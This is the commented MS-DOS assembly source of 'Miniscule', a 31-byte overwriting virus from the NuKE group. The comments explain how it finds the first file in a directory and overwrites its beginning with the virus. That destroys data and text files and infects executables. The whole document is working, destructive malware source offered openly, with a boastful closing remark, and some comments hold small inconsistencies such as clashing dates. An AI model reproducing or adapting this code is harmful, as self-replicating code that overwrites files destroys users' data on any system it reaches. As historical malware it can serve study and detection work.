; Miniscule:  the world's smallest generic virus (only 31 bytes long!)
; (C) 1992 Nowhere Man and [NuKE] WaReZ
; Written on January 22, 1991

code		segment 'CODE'
		assume cs:code,ds:code,es:code,ss:code

		org	0100h

main		proc	near


; Find the name of the first file and return it in the DTA.  No checking
; is done for previous infections, and ANY file (except directory "files")
; will be infected, including data, texts, etc.  So either a file is corrupted
; (in the case of data or text) or infected (.EXE and .COM files).  Files that
; have the read-only flag set are immune to Miniscule.

		mov	ah,04Eh			; DOS find first file function
		mov	cl,020h			; CX holds attribute mask
		mov	dx,offset star_dot_com	; DX points to the file mask
		int	021h


; Open the file that we've found for writing only and put the handle into
; BX (DOS stupidly returns the file handle in AX, but all other DOS functions
; require it to be in AX, so we have to move it).

		mov	ax,03D01h		; DOS open file function, w/o
		mov	dx,009Eh		; DX points to the found file
		int	021h

		xchg	bx,ax			; BX holds the file handle


; Write the virus to the file.  The first 31 bytes at offset 0100h (ie: the
; virus) are written into the beginning of the victim.  No attempt is made
; to preserve the victim's executability.  This also destroys the file's date
; and time, making Miniscule's activity painfully obvious.  Also, if the
; victim is smaller than 31 bytes (rare), then it will grow to exactly 31.

		mov	ah,040h			; DOS write to file function
		dec	cx			; CX now holds 01Fh (length)
		mov	dx,offset main		; DX points to start of code
		int	021h


; Exit.  I chose to use a RET statement here to save one byte (RET is one byte
; long, INT 020h is two), so don't try to compile this as an .EXE file; it
; will crash, as only .COMs RETurn correctly (DOS again).  However INFECTED
; .EXE programs will run successfully (unless they are larger than 64k, in
; which case DOS will refuse to run it.

		ret				; RETurn to DOS
main		endp


; The only data required in this program, and it's only four bytes long.  This
; is the file mask that the DOS find first file function will use when
; searching.  Do not change this to .EXE (or whatever) because this virus
; is size dependent (if you know what you're doing, go ahead [at you're own
; risk]).

star_dot_com	db	"*.*",0			; File search mask

finish		label	near

code		ends
		end	main

; There you have it:  thirty-one bytes of pure terror -- NOT!  As you can
; pretty well guess, this virus is very lame.  Due to its poor reproduction,
; it is hardly a threat (hitting one file, if you're lucky), but it works,
; and it fits the definition of a virus.  There is no way to make this code
; any smaller (at least under MS-DOS), except if you made it only infect
; one specific file (and the file would have to have a one- or two-byte name,
; too), and that would be next to useless.